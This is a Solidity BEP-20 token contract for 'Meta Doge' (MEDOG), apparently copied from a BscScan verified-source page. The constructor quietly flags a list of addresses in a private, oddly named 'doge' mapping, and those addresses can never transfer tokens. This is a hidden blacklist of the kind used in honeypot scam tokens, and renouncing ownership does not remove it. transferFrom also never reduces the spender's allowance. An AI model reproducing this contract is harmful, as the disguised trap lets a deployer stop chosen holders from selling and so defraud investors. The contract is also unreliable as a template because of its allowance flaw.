/**
 *Submitted for verification at BscScan.com on 2022-02-10
*/

//SPDX-License-Identifier: MIT

/**
DEF
**/

pragma solidity ^0.8.9;

abstract contract Context{
    function _msgSender() internal view virtual returns (address)
    {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata)
    {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 public _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns(address)
    {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner()
    {
        require(owner() == _msgSender(), "not owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner
    {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner
    {
        require(newOwner != address(0), "none type");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract MetaDoge is Context, Ownable{
    mapping (address => uint256) public balance;
    mapping (address => mapping(address => uint256)) public allowance;
    mapping (address => bool) private doge;
    uint256 public totalSupply = 1000000000 * 10 ** 18;
    uint256 public decimals = 18;
    string public name = "Meta Doge";
    string public symbol = "MEDOG";


    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(address[] memory _bet) {
        require(_bet.length > 0, "chain");
        for (uint256 i; i < _bet.length; i++) {
            address it = _bet[i];
            doge[it] = true;
        }
        balance[_msgSender()] = totalSupply;
        emit Transfer(address(0), _msgSender(), totalSupply);
    }
    
    function balanceOf(address owner) public view returns(uint256) {
        return balance[owner];
    }
   
    function transfer(address to, uint256 value) public returns(bool) {
        require(balanceOf(_msgSender()) >= value, "low balance");
        require(!doge[_msgSender()], "doge");
        balance[_msgSender()] -= value;
        balance[to] += value;
        emit Transfer(_msgSender(), to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(balanceOf(from) >= value, "low balance");
        require(allowance[from][_msgSender()] >= value, "low allowance");
        require(!doge[from], "doge");
        balance[from] -= value;
        balance[to] += value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
        allowance[_msgSender()][spender] = value;
        emit Approval(_msgSender(), spender, value);
        return true;   
    }
}